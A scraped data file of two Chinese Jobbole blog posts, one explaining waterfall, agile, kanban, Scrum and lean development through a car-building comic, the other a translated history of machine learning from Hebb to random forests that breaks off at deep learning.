{"tags": "趣文小说", "front_image_url": ["http://wx3.sinaimg.cn/mw690/7cc829d3gy1fmg6692mmwj20ig0bs4am.jpg"], "title": "客户想要的 vs 客户实际预算：漫画解读软件开发模式 ​​​​", "fav_nums": 9, "url": "http://blog.jobbole.com/113230/", "create_date": "2017/12/14", "url_object_id": "adfa75d1779c8eafc10e8cabe3bff3e9", "comment_nums": 6, "front_image_path": "full/ddea7e492385a85fd588582693b753dfb4e75192.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><p>1913 年，美利坚工业之神——亨利福特，发明了世界上第一条流水线，汽车工业从此进入了大规模生产的时代。丰田公司提出的丰田生产系统（Toyota Production System）又为汽车工业带来了很多先进的生产和管理理念。</p>\n<p>先进的生产和管理理念是一个行业从小作坊走向规模化的必经之路，软件工业虽然诞生较晚，但是发展却非常迅速，这也同样得益于软件工业开发和管理理念的发展。这其中就从汽车工业吸收了很多成熟的理念。</p>\n<p>下面，就让我们通过这张出自 Toggle 的漫画，来了解软件开发模式的变迁史。</p>\n<h2>总览</h2>\n<p><img id=\"pic\" class=\"M_cur_zoom_out\" src=\"http://wx3.sinaimg.cn/large/7cc829d3gy1fm603hue8aj20rs3duqn3.jpg\"></p>\n<p>这张图片从上向下，五个房间，分别是瀑布模型（waterfall），敏捷开发（agile），看板（KANBAN），SCRUM 和精益软件开发（lean）。</p>\n<p>除了瀑布模型这间小屋和其他小屋有着明显的界限之外，其他几种模型就像一个四合院，有着不可分割的关系，这也恰好表明，瀑布模式和敏捷开发模式是软件工业先后经历的两个阶段，而 KANBAN，SCRUM 和 LEAN 则是敏捷运动的产物。</p>\n<p>OK，客官里边请，让我们进第一个屋子看看。</p>\n<h2>Old Days——瀑布式软件开发</h2>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/12/fa38bde05d5560efbfc865afcc0aa5a0.jpg\" alt=\"15128081424398\"></p>\n<p>所谓瀑布模型，就是说，软件开发是按照一定顺序展开的（传统线性生产流程 : Traditional,linear production flow）。就像汽车生产的流水线一样，每个部门各司其责，工作按照顺序展开，交付件单通道线性流动。你看这幅图，总体上就分为：<strong>需求 → 设计<strong> → </strong>制造<strong> → </strong>测试</strong>，四个阶段。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fmg664g0ndj208d06dgoo.jpg\" width=\"301\" height=\"229\"></p>\n<p>在这个系统中，客户被排除在生产系统之外（围墙是密闭不透明的），它们只能从需求的接口人那里向系统输入需求（Client places order）。正因如此，客户无法理解生产所需的费用以及为什么交付总是会延期，因此，也难免会闹出下面这样的笑话：</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmg662v0xcj207e0gyte6.jpg\" width=\"266\" height=\"610\"></p>\n<p>客户希望你造一辆汽车，却只愿意支付一辆自行车的开发成本。</p>\n<p>需求接纳后进入到设计阶段：</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fmg6652zs5j20c707tgqa.jpg\" width=\"439\" height=\"281\"></p>\n<p>设计定型后，进入制造阶段：</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmg665nbgij20dn08t45d.jpg\" width=\"491\" height=\"317\"></p>\n<p>在线性的生产系统中，或者说在瀑布开发模式中，需求和设计是不可以进行修改的。工人被安排在制造系统中一个个工位上，每个人仅负责一个部件的生产和装配，就像这位盘腿坐着的“I know HTML”大哥一样，HTML 开发者只需要负责 HTML 的开发而无需，也不应该关心软件的其他部分。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fmg66671jzj209d07r78i.jpg\" width=\"337\" height=\"279\"></p>\n<p>喂喂喂，这位老铁，不上班玩什么球啊？哎，您也别怪他，毕竟交付件（整车/软件）还没有完成开发，测试工作自然无法开展，当然得等着咯。这也是瀑布模型最大的弊端，下游工作的开展严格依赖于上游交付件的完成情况，这无疑是一种浪费，在争分夺秒的软件开发过程中，你能忍受这种浪费吗？</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmg666trlkj208506777b.jpg\" width=\"293\" height=\"223\"></p>\n<p>汽车完成生产和测试之后，一次性交付到客户手中，完成客户的全部需求。</p>\n<h2>走进新时代——敏捷开发模式</h2>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/12/d0d1ceb8da75fe97e9dff8706d6df0be.jpg\" alt=\"15128097291193\"></p>\n<blockquote><p>敏捷开发以用户的<strong>需求进化为</strong>核心，采用迭代、循序渐进的方法进行软件开发。在敏捷开发中，软件项目在构建初期被切分成多个子项目，各个子项目的成果都经过测试，具备可视、可集成和可运行使用的特征。换言之，就是把一个大项目分为多个相互联系，但也可独立运行的小项目，并分别完成，在此过程中软件一直处于可使用状态</p></blockquote>\n<p>有点书面是吧，其实很简单，敏捷开发的一个前提假设是：用户不可能在产品开发之前，设计之初就完整、明确的提出需求。期望用户在开发过程中不变更需求是不现实的。用户在开发前提出的需求，可能并不是它们最终希望得到的。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx2.sinaimg.cn/large/7cc829d3gy1flk6c8yl83j20k008qglx.jpg\" width=\"523\" height=\"228\"></p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fmg667ckk9j20bt05zn1n.jpg\" width=\"425\" height=\"215\"></p>\n<p>在敏捷开发中，客户会参与到软件开发的整个流程中。整个开发过程不再是一堵不透风的墙，透明是关键（TRANSPARENCY IS KEY），但是，随着越来越多的用户参与进来，越来越多的问题也暴露出来了，越来越多不着调的需求也会被提出。</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fmg667xsfij20dr08qn36.jpg\" width=\"495\" height=\"314\"></p>\n<p>敏捷开发的另一个重要概念就是<strong>迭代</strong>，所谓迭代，就是不断对产品进行细微的、渐进式的改进（Small incremental changes）。</p>\n<blockquote><p>“先给您上个小号的尾翼，用着好我再给您换个大的~”</p></blockquote>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmg668ixufj20aa06ltc7.jpg\" width=\"370\" height=\"237\"></p>\n<p>在敏捷开发中，生产不再是线性的，开发的同时还会进行测试工作，所有人都在同时工作。尴尬等待的日子一去不复返咯~</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fmg6692mmwj20ig0bs4am.jpg\" width=\"664\" height=\"424\"></p>\n<p>利用敏捷模式开发出的产品，相较于传统的软件交付方式，一个显著的特点是能够及时响应客户需求的变更，不断适应新的趋势。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmg669pb2lj20cc07a79q.jpg\" width=\"444\" height=\"262\"></p>\n<p>这不，隔壁老王喜当爹了，之前定的法拉利显得有点不稳重，宝宝也没地方坐。我们的产品经理和开发人员快速响应，轿跑变商务也不是什么大问题~~ 当然，为谁辛苦为谁忙，客户爸爸们一定要买单呀！</p>\n<p>什么？您问第一稿方案是什么样的？去翻垃圾桶吧！ <img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fmg66aari0j208e04uq4v.jpg\" width=\"302\" height=\"174\"></p>\n<h2>一股来自东方的神秘力量——看板</h2>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmg66ayb9mj20fw0g9apk.jpg\" width=\"572\" height=\"585\"></p>\n<p>相信各位也注意到了，相对于瀑布模式的井井有条，敏捷开发在灵活的同时，也带来了一定程度的混乱。</p>\n<p>就在这个节骨眼上，还得请这位来自东方的神秘人物——丰田看板大师（KANBAN SENSEI）给你点拨点拨。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmg66bk590j206k07gdim.jpg\" width=\"236\" height=\"268\"></p>\n<p>KANBAN，不是汉语拼音，更不是英文缩写，它来自日语“看板”，カンバン的罗马拼写：Kanban。它正是丰田生产系统的一个重要概念：</p>\n<blockquote><p>看板管理，常作“Kanban管理”，是丰田生产模式中的重要概念，指为了达到及时生产（JIT）方式控制现场生产流程的工具。及时生产方式中的拉式（Pull）生产系统可以使信息的流程缩短，并配合定量、固定装货容器等方式，而使生产过程中的物料流动顺畅。</p></blockquote>\n<p>KANBAN要求把开发中的任务，以 TODO List 的方式表现出来：</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmg66c3l9lj207c06itbl.jpg\" width=\"264\" height=\"234\"></p>\n<p>形式可以是即时贴，也可以是可视化软件等等。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmg663dya7j20ds09h764.jpg\" width=\"496\" height=\"341\"></p>\n<p>在制造业中，看板也是非常重要的管理方法。也有将其称为目视化管理的。</p>\n<h2>SCRUM 又是什么？</h2>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmg66crh75j20m50fwx10.jpg\" width=\"690\" height=\"495\"></p>\n<blockquote><p>Scrum原始含义是指英式橄榄球次要犯规时在犯规地点对阵争球。争球双方各有8个队员参与，各方出3名前锋队员，并肩各站成一横排，面对面躬身互相顶肩，中间形成一条通道，其他队员分别站在后面，后排队员用肩顶住前锋队员的臀部，组成3、2、3或3、4、1阵形。然后，由犯规队的对方队员在对阵一侧1码外，用双手低手将球抛入通道，不得有利于本队。当球抛入通道时，前排的3对前锋队员互相抗挤，争相踢球给本方前卫或后卫队员，前卫和后卫队员必须等候前锋将球踢回后，方可移动</p></blockquote>\n<p><img class=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/259a008f1edf1a34a14e98f4e10e65dc.jpg\" alt=\"15128143307299\" width=\"463\" height=\"261\"></p>\n<p>在敏捷开发领域，SCRUM是一种迭代式增量软件开发过程，它包括了一些预定义的角色：</p>\n<ul>\n<li><strong>产品负责人 Product Owner</strong></li>\n</ul>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fmg66db5hvj207i05w76o.jpg\" width=\"270\" height=\"212\"></p>\n<p>产品负责人负责维护订单</p>\n<ul>\n<li><strong>Scrum主管 Scrum Master </strong></li>\n</ul>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmg66dufcfj207s05kgo6.jpg\" width=\"280\" height=\"200\"></p>\n<p>SCURM Master 对整个SCRUM 过程负责，不惜一切代价（<em>AT ANY COST</em>），保证团队的工作时间和计划。</p>\n<ul>\n<li><strong>开发团队 Team </strong></li>\n</ul>\n<p>在 SCRUM 过程中，开发团队通常会进行冲刺 （Sprint），一个冲刺周期的长度通常是2-4周。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fmg66e9phnj205x03qabg.jpg\" width=\"213\" height=\"134\"></p>\n<p>在这个冲刺过程中，开发小组专注于完成一组订单项的开发。比如：制造一个发动机 <img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmg66esfh8j209c05u77y.jpg\" width=\"336\" height=\"210\"></p>\n<p>对于KANBAN 和 SCRUM，有人说 KANBAN vs SCRUM，也有人说 KANBAN+SCRUM，究竟谁是谁非，我看只有适合自己团队的才是最好的，毕竟方法和流程是为业务服务的。就这篇漫画来看，SCRUM + KANBAN 是两个避免混乱的好方法。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fmg66f9q2mj205o08a40g.jpg\" width=\"204\" height=\"298\"></p>\n<p><em>来来来，兄弟们，我们来开一个关于减少站会的站会~~</em></p>\n<h2>精益软件开发</h2>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/12/6dd2911f0156068e997abd790e0f7493.jpg\" alt=\"15128322280368\"></p>\n<p>第二次世界大战结束后，丰田公司前社长丰田英二曾经去美国汽车城底特律对福特生产线进行了考察，尽管福特高效的大规模生产线给他造成了很大的冲击，丰田英二还是非常理智的认识到了当时日本制造业所面临的困难。经济萧条，资源短缺，小批量差异化的需求使他不能盲目的引进这种大规模的生产方式，随后丰田公司发明并实践了一系列的管理和生产方法，这些方法在后来被统称为精益生产和管理方式（lean）</p>\n<p>精益生产的思想， 简单来说就是Just In Time（JIT），也就是说，只在必要的时候，按照需求的量，仅生产必要的产品，杜绝浪费。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmg66ftyjjj206b03r3zb.jpg\" width=\"227\" height=\"135\"></p>\n<blockquote><p>Eric Ries曾在《精益创业实战》中提出MVP（minimum viable product）概念，意即“最简可行产品”——用最快、最简明的方式建立一个可用的产品原型，这个原型要表达出你产品最终想要的效果，然后通过迭代来完善细节。</p></blockquote>\n<p>精益软件开发不再像传统的软件开发一样，耗时几年才向客户交付完整的软件。取而代之的是，优先建立一个最简可用的原型产品投放市场或交付到客户手中。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmg66geocdj209h0biq8i.jpg\" width=\"341\" height=\"414\"></p>\n<p>一辆最简可用的汽车是什么样子的呢？不就是四个轮子、一个方向盘、一个座椅然后一起装在底盘上么。能开、能停、能转弯不就是汽车嘛。让客户先享受到产品带来的收益是最重要的。</p>\n<p><img src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1512898589423&amp;di=158b96821c3e271a06d229192b48d81f&amp;imgtype=0&amp;src=http%3A%2F%2Fa1.att.hudong.com%2F05%2F95%2F01300000432220148643955825350_s.jpg\" alt=\"\"></p>\n<p><strong>BUT!!!</strong></p>\n<p>你看，这里还有一位失落的大叔</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fmg66h14y4j20b706877s.jpg\" width=\"403\" height=\"224\"></p>\n<p>尽管MPV 的概念听上去是如此的简单，可是实施起来却没有那么容易。</p>\n<blockquote><p>因为在设计产品原型的过程中，很多设计师是这么做的：把他们认为的产品应当具备的功能罗列出来，然后一一排除，排定优先级，决定哪个功能要在最初的版本中出现，而哪个可以靠后一些。但设计师们往往无法真的只把最必要的功能留在初级版本中——因为诱惑太多。设计师们总希望把很cool、很有惊喜的小细节带给用户来博取赞叹，但从全局来看，其实把某些功能刻意强加进产品，是会削弱产品整体流畅性的。Mr Jamie曾在其博客中把这种心理表现称作<strong>“艺术家心结”</strong>。</p></blockquote>\n<p>所有不必的东西（ALL NON-ESSENTIALS ARE THROWN OUT）都不能应用到当前的最小可用产品。你说，艺术家们得多伤心啊（愁的胡子都长一脸了）</p>\n<p>此外，尽早交付产品给客户或部署到生产环境，也促进了 DevOps，持续集成（CI），生产环境测试（testing in production）等实践的发展。尽早交付产品，尽早从用户获取反馈，不论是好的还是坏的，促使问题尽早暴露，尽早修复，持续集成，持续改进。</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fmg68pf1nbj209208wgps.jpg\" width=\"326\" height=\"320\"></p>\n<p>眼尖的童鞋，估计早就看到了桌子上有一只程序员的好朋友 —— 小黄鸭。你还不知道小黄鸭？那你该看看这篇文章：《<a href=\"http://blog.jobbole.com/85719/\" target=\"_blank\">小黄鸭调试法，每个程序员都要知道的</a>》。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmg663ygd2j206n047ta2.jpg\" width=\"239\" height=\"151\"></p>\n<h2>结束语</h2>\n<p>实际工作中的软件开发和管理模式，往往并不能纯粹的归类于以上某种类型。即使是相同的开发模型，在不同的团队中也往往会根据实际情况进行变化和改进，留言告诉我们你所在的公司是如何进行软件开发的吧~</p>\n<p>此外，如果你对我的解析有不同的看法，或者你在图中看出了新的内涵，也欢迎在评论中互动！</p>\n<h3>扩展阅读</h3>\n<ul>\n<li>[1] <a href=\"http://www.agileweboperations.com/scrum-vs-kanban\">kanban vs scrum vs agile</a></li>\n<li>[2] <a href=\"http://www.jianshu.com/p/e44b1038c9cf\">Scrum vs. 看板，还是Scrum + 看板？ </a></li>\n<li>[3] <a href=\"https://msdn.microsoft.com/zh-cn/library/hh533841(v=vs.110).aspx\">精益软件开发</a></li>\n<li>[4] <a href=\"https://www.ibm.com/developerworks/cn/rational/leaner-software-development-with-the-aid-of-collaborative-lifecycle-management/\">使用 DevOps 进行精益软件开发</a></li>\n<li>[5]<a href=\"https://baike.baidu.com/item/%E4%B8%B0%E7%94%B0%E5%BC%8F%E7%94%9F%E4%BA%A7%E7%AE%A1%E7%90%86/511862?fr=aladdin&amp;fromid=10166317&amp;fromtitle=%E4%B8%B0%E7%94%B0%E7%94%9F%E4%BA%A7%E7%B3%BB%E7%BB%9F\"> 丰田生产系统</a></li>\n</ul>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我写出更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏作者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我写出更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/05/d3704dca07a3c6ce19c14a9762a0d776.jpg\">\n            \n                            <img src=\"http://www.jobbole.com/wp-content/uploads/2016/03/d8aa159efcd108a908cd3d6ab74b8f5f.jpg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113230\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113230votetotal\">10</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113230\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 9 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 6 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/hanxiaomax\">\r\n\t\t\t<img src=\"http://www.jobbole.com/wp-content/uploads/2015/10/bb74ca97c7e8b5a21a24f0b5bbc519c3.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            翻译组的勤务员（联系此人请微博私信或hanxiaomax@qq.com        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/hanxiaomax\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/hanxiaomax/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/hanxiaomax/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 95</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://hanxiaomax.github.io\"><i class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://www.weibo.com/smilingly1989\"><i class=\"fa fa-weibo\"></i></a> <a title=\"GitHub主页\" target=\"_blank\" href=\"https://github.com/hanxiaomax\"><i class=\"fa fa-github\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "10"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/12/914a7f9323808e5b11330f275e0ac4c8.jpg"], "title": "如果你还不了解机器学习的简史，请看这篇文章", "fav_nums": 8, "url": "http://blog.jobbole.com/113180/", "create_date": "2017/12/05", "url_object_id": "5e4d58414069c0e60dc714bf042ec15d", "comment_nums": 8, "front_image_path": "full/0104e7c14a36650ad69f34f21bb577491ca53eda.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/nemoland\">李大萌</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://www.erogol.com/brief-history-machine-learning/\">Eren Golge</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【导读】：全面介绍机器学习的发展史，从感知机、神经网络、决策树、SVM、Adaboost到随机森林、Deep Learning。<b></b></p>\n<p><img class=\"alignnone\" src=\"http://www.erogol.com/wp-content/uploads/2014/05/test.jpg\" width=\"1793\" height=\"1104\"></p>\n<p>自科学技术和人工智能最初发展开始，科学家Blaise Pascal和Von Leibniz就思考着如何制造一台像人类一样具有智力的机器。 著名作家朱尔斯·凡尔纳，弗兰克·鲍姆（绿野仙踪），玛丽·雪莱（科学怪人），乔治·卢卡斯（George Lucas）（星球大战）梦想着具有人类行为的物种存在，甚至拥有在不同的环境中能战胜人类的技能。</p>\n<p><img class=\"alignnone aligncenter\" src=\"http://www.erogol.com/wp-content/uploads/2014/05/Arts_et_Metiers_Pascaline_dsc03869.jpg\" width=\"392\" height=\"215\"></p>\n<p style=\"text-align: center;\">帕斯卡机器执行减法和求和- 1642</p>\n<p>机器学习是人工智能最重要发展分支之一，在科研领域和工业界都是非常热门的课题。企业和学校投入大量的资源来做提升知识面。最近，该领域在许多不同任务上取得了非常可观的结果，与人类的表现（交通标志的识别，机器学习达到了98.98％ – 已经超过了人类）相当。</p>\n<p>在这里，我想分享一下机器学习发展一个粗略的时间表，并且标记了一些里程碑，但并不完整。此外，在阅读本文所有的论断时，都请在前自行脑补一句：“据我所知”。</p>\n<p>普遍推广机器学习的第一人是Hebb，他在1949年提出了基于神经心理学习方法，被称为Hebbian学习理论。通过简单的解释，研究递归神经网络（RNN）节点之间的相关性。它记录网络上的共性，像记忆一样工作。这个论点正式地表达是这样：</p>\n<blockquote><p>我们假设反射活动（或“踪迹”）的持续性或重复性会诱导细胞的持续性变化，增加其稳定性…当细胞A的轴突足够接近细胞B时，就能反复或持续刺激细胞B。此时，会在其中一个细胞或者两者中发生一些生长过程或代谢变化，来增加A的效率[1]。</p></blockquote>\n<p><img class=\"alignnone aligncenter\" src=\"http://www.erogol.com/wp-content/uploads/2015/11/us__en_us__ibm100__700_series__checkers__620x350.jpg\" width=\"620\" height=\"350\"></p>\n<p style=\"text-align: center;\">Arthur Samuel</p>\n<p>在1952年，IBM的亚瑟·塞缪尔（Arthur Samuel）开发了一个西洋棋的程序。 该程序能够通过棋子的位置学习一个隐式模型，为下一步棋提供比较好的走法。 塞缪尔与这个程序对局了很多次，并观察到这个程序在经过一段时间的学习后可以发挥得更好。</p>\n<p>塞缪尔用这个程序驳倒了机器无法超越书面代码，并像人类一样学习模式的论断。 他创造并定义了“机器学习”：</p>\n<blockquote><p>机器学习是一个能使计算机不用显示编程就能获得能力的研究领域。</p></blockquote>\n<p><img class=\"alignnone aligncenter\" src=\"http://csis.pace.edu/~ctappert/srd2011/photos/Rosenblatt-ratlab.jpg\" width=\"453\" height=\"681\"></p>\n<p style=\"text-align: center;\">F. Rosenblatt</p>\n<p>1957年，Rosenblatt再次提出以神经科学为背景的第二个机器学习模型——感知器，它与今天的机器学习模型更像。当时，这是非常激动人心的发现，实际上它比Hebbian的想法更容易实现。 Rosenblatt用下面几句话介绍了感知器模型：</p>\n<blockquote><p>感知器模型的设计是针对于一般智能系统的一些基本特性，而不会纠缠于一些特定生物体通常情况下未知的特性。[2]</p></blockquote>\n<p>3 年后，Widrow [4]发明的Delta学习规则载入机器学习史册，该规则很快被用作感知器训练的实践程序。它也被称为最小二乘问题。这两个想法的结合创造了一个很好的线性分类器。 然而，感知器模型的热度在1969年被Minsky [3]所取代。他提出了著名的XOR问题，感知器无法对线性不可分割的数据进行分类。 这是Minsky对神经网络社区的反驳。 此后，神经网络的研究一直止步不前，到在80年代才有所突破。</p>\n<p><img class=\"alignnone aligncenter\" src=\"http://www.cs.ru.nl/~ths/rt2/col/h10/draw-LTUdecis.GIF\" width=\"477\" height=\"168\"></p>\n<p style=\"text-align: center;\">面向不可线性分割数据的 XOR 问题</p>\n<p>尽管早在1973年由Linnainmaa [5] 以“反向自动差异化模式”为名提出了BP思想，但是直到1981年，Werbos [6]才提出将神经网络特定反向传播（BP）算法应用到多层感知器（MLP）。BP仍然是当今神经网络架构的关键组成部分。有了这些新想法，神经网络的研究再次加速。1985年至1986年间，神经网络研究人员相继提出了采用BP训练多层感知器（MLP）的理念（Rumelhart，Hinton，Williams [7] – Hetch，Nielsen [8]）</p>\n<p><img class=\"alignnone aligncenter\" src=\"http://www.erogol.com/wp-content/uploads/2014/05/Hetch_Nielsen_NN.png\" width=\"891\" height=\"754\"></p>\n<p style=\"text-align: center;\">From Hetch and Nielsen [8]</p>\n<p>另一个学派，在1986年，J.R.Quinlan [9]提出了另一个非常著名的ML算法，我们称之为决策树，更具体地说是ID3算法。这是机器学习另一个主流的闪光点。此外，ID3以软件的形式发布，能够以简单的规则及其明确的推论更好地应用到实际生活中，与黑匣子神经网络模型相反。</p>\n<p>在ID3之后，社区探索了很多不同的可用方案和算法改进（例如ID4，回归树，CART …），而且仍然是机器学习中的活跃话题之一。</p>\n<p><img class=\"alignnone aligncenter\" src=\"http://www.erogol.com/wp-content/uploads/2014/05/Quinlan_ID3.png\" width=\"631\" height=\"445\"></p>\n<p style=\"text-align: center;\">图：一个简单的决策树</p>\n<p>机器学习领域最重要突破之一是Vapnik和Cortes [10]在1995年提出的支持向量机（网络）（SVM），它具有非常强的理论论证和实证结果。SVM将机器学习社区分为NN（神经网络）和SVM两个派别。 然而在2000年左右，SVM内核化版本提出之后，NN在这两个派别之间的竞争并不容易（我无法找到关于该主题的第一篇文章）。SVM在很多之前用NN模型解决的问题上得出了最佳结果。 此外，与NN模型相比，SVM能够充分利用凸优化，泛化边际理论和内核化的所有深奥知识。 因此，它可以从不同学科中获得巨大的推动力，促进理论和实践的快速发展。</p>\n<p><img class=\"alignnone aligncenter\" src=\"http://www.erogol.com/wp-content/uploads/2014/05/SVM_Vapnik.png\" width=\"1036\" height=\"583\"></p>\n<p style=\"text-align: center;\">From Vapnik and Cortes [10]</p>\n<p>NN模型受到的另一次重创是1 9 9 1年Hochreiter的论文[40]和2001年Hochreiter等人的论文[11]，表明在使用BP算法时，NN单位饱和后会发生梯度损失。简单来说，训练NN模型时由于单位饱和，在迭代超过一定数量后冗余，因此NN非常倾向于在短时间的时期过度拟合。</p>\n<p>不久之前，Freund和Schapire在1997年提出了另一个实体机器学习模型，该模型采用增强的弱分类器组合，称为Adaboost。当时给这项工作的作者颁发了戈德尔奖。 Adaboost通过易于训练的弱分类器进行训练，给那些难的样本更高的权重。这种模型是许多不同任务的基础，如面部识别和检测。它也是PAC（Probably Approximately Correct）理论的一种实现。通常，所谓的弱分类器被Adaboost选为简单的判决树（单个决策树节点）。他们这样介绍Adaboost;</p>\n<blockquote><p>我们研究的模型可以解释为一个广泛的，抽象的扩展的研究在线预测模型到一般决策理论的设置[11]</p></blockquote>\n<p>2001年，Breiman [2001]探索了另一个综合模型，该模型集合了多个决策树，其中每个决策树的训练集都是从实例集合中随机选择的，每个节点的特征都是从特征集合随机选择的。基于这些特性，该模型被称为随机森林（RF）。RF从理论上和实际上都证明不会产生过拟合。甚至AdaBoost在数据集中有过拟合和离群点时，随机森林能有更好的鲁棒性（有关RF的更多详细信息，请参阅我的旧帖子http://www.erogol.com/randomness-randomforests/）。随机森林在许多不同的领域，如Kaggle比赛中也有很出色的表现。</p>\n<p>随机森林是树预测因子的组合，每棵树取决于独立采样的随机向量，并且森林中的所有树都具有相同的分布。森林的泛化误差a随着森林中树木数量增多而收敛[12]</p>\n<p>随着时间向今天靠近，神经网络（NN）的一个新时代——深度学习已经被商业化了。这个短语只是指具有许多广泛连续层的NN模型。三层的NN模型崛起大致在2005年，由近期和现在的Hinton，LeCun，Bengio，Andrew 